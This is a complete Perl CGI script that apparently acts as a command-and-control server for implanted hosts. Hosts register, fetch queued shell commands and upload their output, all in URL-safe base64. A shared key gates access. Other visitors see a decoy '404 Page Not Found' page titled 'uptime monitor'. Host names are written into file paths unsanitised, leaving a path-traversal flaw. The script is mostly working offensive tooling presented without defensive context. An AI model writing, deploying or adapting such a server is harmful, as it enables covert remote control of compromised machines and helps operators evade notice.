#!/usr/bin/perl
#
# 
#  

use CGI;
use strict;
use warnings;
use File::Path qw(make_path remove_tree);
use MIME::Base64;

$CGI::POST_MAX=1024 * 2000;

# decodes a url safe bas64 encoded string 
sub proc_decurl {

        my $raw_string = $_[0];
        $raw_string =~ tr/!/=/;
        $raw_string =~ tr/_/\//;
        $raw_string =~ tr/-/+/;
        my $dec_string = decode_base64($raw_string);

        return $dec_string;
}

# encodes command with base64 before printing to webpage
sub proc_enccmd {

	my $string = $_[0];
	my $enc_string = encode_base64($string);

	return $enc_string;

}

# generates random string 
sub rstring {

	my @chr = ("A".."Z", "a".."z");
	my $rloop = int(35);
	my $rstring;

	while ($rloop != 0) 
	{

		$rstring .= $chr[int(rand(52))];
		$rloop--;
		
	}

	return $rstring;

}

# check if file exits then compares contents of file with supplied key
# returns a success or failure
sub auth_client {

	my $cgi  = $_[0];
	my $auth_file = $_[1];

    	# Authentication here
	if (!defined($cgi->param('auth'))) { die "[!] fail!\n"; }
	my $rawkey = $cgi->param('auth');

	my $key = proc_decurl($rawkey);

	chomp($key);

	open(my $fh, '<', $auth_file);
	my $line = <$fh>;
	close $fh;

	my $output = $line;
	chomp($output);

	if ( $output eq $key ) { return "win"; }
	else { return "fail"; } 

}

# subroutine that handles parameters
sub get_param{

	my $cdir = "/var/iac2/systems/";
	my $pass_file = "/var/iac2/init-pass";
	my $param_out;

	# my $sanitize = "a-zA-Z0-9_.-";

	# create cgi object
	my $q = CGI->new();

	# Accepted params, ignore anything else
	if (defined( $q->param('reg')) ) 
	{

		# Authentication here
		my $reg_status = auth_client($q, $pass_file);
		if ( $reg_status eq 'fail' ) { die "[!] fail!\n"; } 

        my $enc_new_host = $q->param('reg');
		my $new_host = proc_decurl($enc_new_host);
		my $full_path = $cdir . $new_host;

		if ( ! -e $full_path )
		{

			my $outfilepath = $full_path;
			open(my $fh, '+>', "$outfilepath" );
			print $fh "\n";
			close $fh;
			
			my $cmdfilepath = $full_path . '-command';
			open(my $fh2, '+>', "$cmdfilepath" );
			print $fh2 "\n";			
			close $fh;

			my $stdoutpath = $full_path . '-stdout';
			open(my $fh3, '+>', "$stdoutpath" );
			print $fh3 "\n";
			close $fh3;

			$param_out = $new_host . 'has registered';
	
		} else { 
			$param_out = 'hostname already present'; 
		} 

	}
	elsif (defined($q->param('data'))) {
		
		# setup authentication here
        	my $get_status = auth_client($q, $pass_file);
        	if ( $get_status eq 'fail' ) { die "[!] fail!\n"; }
		if (!defined($q->param('host'))) { die "[!] no hostname found!\n"; }

		my $enc_data = $q->param('data');
		my $data = proc_decurl($enc_data);

		my $enc_host = $q->param('host');
		my $host = proc_decurl($enc_host);

        	my $full_path = $cdir . $host;
		my $filepath = $full_path;

		if ( -e $full_path ) 
		{ 

          		open(my $fh, '+>>', $filepath);
				print $fh $data;
			close $fh;

			$param_out = 'updated status for ' . $host . "\n";
			
		}
		
	}
	elsif (defined($q->param('get'))) {

		# setup authentication here
		my $get_status = auth_client($q, $pass_file);
		if ( $get_status eq 'fail' ) { die "[!] fail!\n"; }

		my $enc_host = $q->param('get');
		my $host = proc_decurl($enc_host);

		my $full_path_cmd = $cdir . $host . '-command';
		my $cmdfilepath = $full_path_cmd;

		my $full_path_stdout = $cdir . $host . '-stdout';
		my $stdoutpath = $full_path_stdout;

		if ( -e $full_path_cmd )
		{
			my $code;
			{
                		open my $fh, '<', $cmdfilepath;
					$code = do { local $/; <$fh>};
				close $fh;
			}
            		open(my $fhc, '+>', $cmdfilepath);
				print $fhc "\n";
            		close $fhc;
   			$param_out = $code;
			
		}else { $param_out = 'No hostname found!'; }
		
	}
	elsif (defined($q->param('rsp'))) {

		# setup authentication here
		my $get_status = auth_client($q, $pass_file);
		if ( $get_status eq 'fail' ) { die "[!] fail!\n"; }

		if (!defined($q->param('host'))) { die "[!] no hostname found!\n"; }

		my $enc_rsp = $q->param('rsp');
		my $rsp = proc_decurl($enc_rsp);

		my $enc_host = $q->param('host');
		my $host = proc_decurl($enc_host);

		my $full_path_stdout = $cdir . $host . '-stdout';
		my $stdoutpath = $full_path_stdout;

		my $full_path_command = $cdir . $host . '-command';
		my $commandpath = $full_path_command;

		if ( -e $full_path_stdout )
		{
			open(my $fhs, '+>', $stdoutpath);
				print $fhs $rsp . "\n";
			close $fhs;
		}

		$param_out = 'recieved upload';

       	}  # Trap to catch unwanted request types
	else 
	{ 
		return; 
	}

	return $param_out;

}

sub webpage {

	print "Content-type:text/html\r\n\r\n";
	print '<html><title>uptime monitor</title>';

	my $css = '<style>
	body {
    		background-color: #222222;
    		color: #FFFFFF;
    		font: 15px arial, sans-serif;
    		##font-weight: bold;
	}
	</style><pre>

	<h2>404 Page Not Found. </h2>
	</pre></body>';
	# end of css

	print $css;

}

# subroutine parameter wrapper 
sub main { 

	my @params = @_;

	# perform encoding before printing to page
	my $result = get_param(@params);
	if (!defined($result)) 
	{
		webpage();
	}
	 else 
	{ 
		my $enc_cmd = proc_enccmd($result);
		print $enc_cmd;
		exit
	}
	
}

# Insure these files exist or fail to run
if ( ! -e '/var/iac2/init-pass' ) { 
	die '[!] init-pass file was not found in /var/ica2/systems/ !' . "\n"; 
}

if ( ! -d '/var/iac2/' ) { 
	die '[!] the ica2 folder was not found in /var !' . "\n"; 
}


# run main
main(@ARGV);

